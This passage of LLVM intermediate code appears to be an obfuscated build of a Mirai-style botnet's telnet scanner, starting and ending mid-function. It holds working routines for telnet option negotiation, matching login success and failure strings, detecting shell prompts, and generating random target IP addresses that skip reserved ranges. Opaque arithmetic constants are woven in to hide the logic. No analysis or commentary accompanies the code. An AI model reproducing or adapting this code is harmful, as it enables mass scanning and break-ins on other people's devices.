  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %68

; <label>:61:                                     ; preds = %27
  %62 = load i32, i32* %6, align 4
  %63 = load i8*, i8** %8, align 8
  %64 = load i32, i32* %9, align 4
  %65 = sext i32 %64 to i64
  %66 = call i64 @recv(i32 %62, i8* %63, i64 %65, i32 0)
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %5, align 4
  br label %68

; <label>:68:                                     ; preds = %61, %60
  %69 = load i32, i32* %5, align 4
  ret i32 %69
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %19, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = sub i32 %10, -83622041
  %12 = add i32 %11, 1
  %13 = add i32 %12, -83622041
  %14 = add nsw i32 %10, 1
  store i32 %13, i32* %6, align 4
  %15 = sext i32 %13 to i64
  %16 = getelementptr inbounds i8*, i8** %9, i64 %15
  %17 = load i8*, i8** %16, align 8
  %18 = icmp ne i8* %17, null
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %8
  br label %8

; <label>:20:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %36, %20
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %6, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %4, align 8
  %27 = load i8**, i8*** %5, align 8
  %28 = load i32, i32* %7, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8*, i8** %27, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %26, i8* %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %25
  store i32 1, i32* %3, align 4
  br label %43

; <label>:35:                                     ; preds = %25
  br label %36

; <label>:36:                                     ; preds = %35
  %37 = load i32, i32* %7, align 4
  %38 = add i32 %37, 1701008287
  %39 = add i32 %38, 1
  %40 = sub i32 %39, 1701008287
  %41 = add nsw i32 %37, 1
  store i32 %40, i32* %7, align 4
  br label %21

; <label>:42:                                     ; preds = %21
  store i32 0, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %42, %34
  %44 = load i32, i32* %3, align 4
  ret i32 %44
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.94, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %112, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %119

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %84, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %82

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = add i64 0, %29
  %31 = sub i64 0, %28
  %32 = getelementptr inbounds i8, i8* %26, i64 %30
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %80, label %36

; <label>:36:                                     ; preds = %22
  %37 = load i8*, i8** %3, align 8
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = sub i64 0, %42
  %44 = add i64 0, %43
  %45 = sub i64 0, %42
  %46 = getelementptr inbounds i8, i8* %40, i64 %44
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 32
  br i1 %49, label %80, label %50

; <label>:50:                                     ; preds = %36
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, 4028060952470749049
  %58 = sub i64 %57, %56
  %59 = add i64 %58, 4028060952470749049
  %60 = sub i64 0, %56
  %61 = getelementptr inbounds i8, i8* %54, i64 %59
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 13
  br i1 %64, label %80, label %65

; <label>:65:                                     ; preds = %50
  %66 = load i8*, i8** %3, align 8
  %67 = load i32, i32* %5, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = sub i64 0, 5833926402281222124
  %73 = sub i64 %72, %71
  %74 = add i64 %73, 5833926402281222124
  %75 = sub i64 0, %71
  %76 = getelementptr inbounds i8, i8* %69, i64 %74
  %77 = load i8, i8* %76, align 1
  %78 = sext i8 %77 to i32
  %79 = icmp eq i32 %78, 10
  br label %80

; <label>:80:                                     ; preds = %65, %50, %36, %22
  %81 = phi i1 [ true, %50 ], [ true, %36 ], [ true, %22 ], [ %79, %65 ]
  br label %82

; <label>:82:                                     ; preds = %80, %18
  %83 = phi i1 [ false, %18 ], [ %81, %80 ]
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %82
  %85 = load i32, i32* %7, align 4
  %86 = add i32 %85, 128748761
  %87 = add i32 %86, 1
  %88 = sub i32 %87, 128748761
  %89 = add nsw i32 %85, 1
  store i32 %88, i32* %7, align 4
  br label %18

; <label>:90:                                     ; preds = %82
  %91 = load i8*, i8** %3, align 8
  %92 = load i32, i32* %5, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i32, i32* %7, align 4
  %96 = sext i32 %95 to i64
  %97 = sub i64 0, %96
  %98 = add i64 0, %97
  %99 = sub i64 0, %96
  %100 = getelementptr inbounds i8, i8* %94, i64 %98
  %101 = load i8, i8* %100, align 1
  %102 = sext i8 %101 to i32
  %103 = load i8*, i8** %4, align 8
  %104 = load i32, i32* %6, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp eq i32 %102, %108
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %90
  store i32 1, i32* %2, align 4
  br label %120

; <label>:111:                                    ; preds = %90
  br label %112

; <label>:112:                                    ; preds = %111
  %113 = load i32, i32* %6, align 4
  %114 = sub i32 0, %113
  %115 = sub i32 0, 1
  %116 = add i32 %114, %115
  %117 = sub i32 0, %116
  %118 = add nsw i32 %113, 1
  store i32 %117, i32* %6, align 4
  br label %11

; <label>:119:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %120

; <label>:120:                                    ; preds = %119, %110
  %121 = load i32, i32* %2, align 4
  ret i32 %121
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %166, %8
  %34 = load i32, i32* %18, align 4
  %35 = sub i32 0, %34
  %36 = sub i32 0, 2
  %37 = add i32 %35, %36
  %38 = sub i32 0, %37
  %39 = add nsw i32 %34, 2
  %40 = load i32, i32* %16, align 4
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %52

; <label>:42:                                     ; preds = %33
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br i1 %45, label %50, label %46

; <label>:46:                                     ; preds = %42
  %47 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %48 = load i64, i64* %47, align 8
  %49 = icmp sgt i64 %48, 0
  br label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = phi i1 [ true, %42 ], [ %49, %46 ]
  br label %52

; <label>:52:                                     ; preds = %50, %33
  %53 = phi i1 [ false, %33 ], [ %51, %50 ]
  br i1 %53, label %54, label %167

; <label>:54:                                     ; preds = %52
  br label %55

; <label>:55:                                     ; preds = %54
  %56 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %57 = getelementptr inbounds [16 x i64], [16 x i64]* %56, i64 0, i64 0
  %58 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %57) #3, !srcloc !5
  %59 = extractvalue { i64, i64* } %58, 0
  %60 = extractvalue { i64, i64* } %58, 1
  %61 = trunc i64 %59 to i32
  store i32 %61, i32* %24, align 4
  %62 = ptrtoint i64* %60 to i64
  %63 = trunc i64 %62 to i32
  store i32 %63, i32* %25, align 4
  br label %64

; <label>:64:                                     ; preds = %55
  %65 = load i32, i32* %10, align 4
  %66 = srem i32 %65, 64
  %67 = zext i32 %66 to i64
  %68 = shl i64 1, %67
  %69 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %70 = load i32, i32* %10, align 4
  %71 = sdiv i32 %70, 64
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [16 x i64], [16 x i64]* %69, i64 0, i64 %72
  %74 = load i64, i64* %73, align 8
  %75 = xor i64 %74, -1
  %76 = xor i64 %68, -1
  %77 = xor i64 -8215306253457815918, -1
  %78 = and i64 %75, -8215306253457815918
  %79 = and i64 %74, %77
  %80 = and i64 %76, -8215306253457815918
  %81 = and i64 %68, %77
  %82 = or i64 %78, %79
  %83 = or i64 %80, %81
  %84 = xor i64 %82, %83
  %85 = or i64 %75, %76
  %86 = xor i64 %85, -1
  %87 = or i64 -8215306253457815918, %77
  %88 = and i64 %86, %87
  %89 = or i64 %84, %88
  %90 = or i64 %74, %68
  store i64 %89, i64* %73, align 8
  %91 = load i32, i32* %10, align 4
  %92 = add i32 %91, 78273889
  %93 = add i32 %92, 1
  %94 = sub i32 %93, 78273889
  %95 = add nsw i32 %91, 1
  %96 = call i32 @select(i32 %94, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %97 = icmp slt i32 %96, 1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %64
  br label %167

; <label>:99:                                     ; preds = %64
  %100 = load i8*, i8** %15, align 8
  %101 = load i32, i32* %18, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  store i8* %103, i8** %23, align 8
  %104 = load i32, i32* %10, align 4
  %105 = load i8*, i8** %23, align 8
  %106 = call i64 @recv(i32 %104, i8* %105, i64 1, i32 0)
  %107 = trunc i64 %106 to i32
  store i32 %107, i32* %19, align 4
  %108 = load i32, i32* %19, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %113, label %110

; <label>:110:                                    ; preds = %99
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, 0
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %110, %99
  store i32 0, i32* %9, align 4
  br label %172

; <label>:114:                                    ; preds = %110
  %115 = load i32, i32* %19, align 4
  %116 = load i32, i32* %18, align 4
  %117 = sub i32 0, %116
  %118 = sub i32 0, %115
  %119 = add i32 %117, %118
  %120 = sub i32 0, %119
  %121 = add nsw i32 %116, %115
  store i32 %120, i32* %18, align 4
  %122 = load i8*, i8** %23, align 8
  %123 = load i8, i8* %122, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 255
  br i1 %125, label %126, label %152

; <label>:126:                                    ; preds = %114
  %127 = load i32, i32* %10, align 4
  %128 = load i8*, i8** %23, align 8
  %129 = getelementptr inbounds i8, i8* %128, i64 1
  %130 = call i64 @recv(i32 %127, i8* %129, i64 2, i32 0)
  %131 = trunc i64 %130 to i32
  store i32 %131, i32* %19, align 4
  %132 = load i32, i32* %19, align 4
  %133 = icmp eq i32 %132, -1
  br i1 %133, label %137, label %134

; <label>:134:                                    ; preds = %126
  %135 = load i32, i32* %19, align 4
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %134, %126
  store i32 0, i32* %9, align 4
  br label %172

; <label>:138:                                    ; preds = %134
  %139 = load i32, i32* %19, align 4
  %140 = load i32, i32* %18, align 4
  %141 = sub i32 0, %140
  %142 = sub i32 0, %139
  %143 = add i32 %141, %142
  %144 = sub i32 0, %143
  %145 = add nsw i32 %140, %139
  store i32 %144, i32* %18, align 4
  %146 = load i32, i32* %10, align 4
  %147 = load i8*, i8** %23, align 8
  %148 = call i32 @negotiate(i32 %146, i8* %147, i32 3)
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %151, label %150

; <label>:150:                                    ; preds = %138
  store i32 0, i32* %9, align 4
  br label %172

; <label>:151:                                    ; preds = %138
  br label %166

; <label>:152:                                    ; preds = %114
  %153 = load i8*, i8** %15, align 8
  %154 = load i8*, i8** %11, align 8
  %155 = call i8* @strstr(i8* %153, i8* %154) #9
  %156 = icmp ne i8* %155, null
  br i1 %156, label %164, label %157

; <label>:157:                                    ; preds = %152
  %158 = load i32, i32* %12, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %165

; <label>:160:                                    ; preds = %157
  %161 = load i8*, i8** %15, align 8
  %162 = call i32 @matchPrompt(i8* %161)
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %160, %152
  store i32 1, i32* %20, align 4
  br label %167

; <label>:165:                                    ; preds = %160, %157
  br label %166

; <label>:166:                                    ; preds = %165, %151
  br label %33

; <label>:167:                                    ; preds = %164, %98, %52
  %168 = load i32, i32* %20, align 4
  %169 = icmp ne i32 %168, 0
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %167
  store i32 1, i32* %9, align 4
  br label %172

; <label>:171:                                    ; preds = %167
  store i32 0, i32* %9, align 4
  br label %172

; <label>:172:                                    ; preds = %171, %170, %150, %137, %113
  %173 = load i32, i32* %9, align 4
  ret i32 %173
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #3
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #3
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #3
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %2324, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %2322, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %2322, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %2322, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %2322, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 56
  br i1 %33, label %2322, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 10
  br i1 %37, label %2322, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 25
  br i1 %41, label %2322, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 49
  br i1 %45, label %2322, label %46

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 50
  br i1 %49, label %2322, label %50

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 137
  br i1 %53, label %2322, label %54

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 6
  br i1 %57, label %2322, label %58

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 7
  br i1 %61, label %2322, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 11
  br i1 %65, label %2322, label %66

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 21
  br i1 %69, label %2322, label %70

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 22
  br i1 %73, label %2322, label %74

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 26
  br i1 %77, label %2322, label %78

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 28
  br i1 %81, label %2322, label %82

; <label>:82:                                     ; preds = %78
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 29
  br i1 %85, label %2322, label %86

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 30
  br i1 %89, label %2322, label %90

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 33
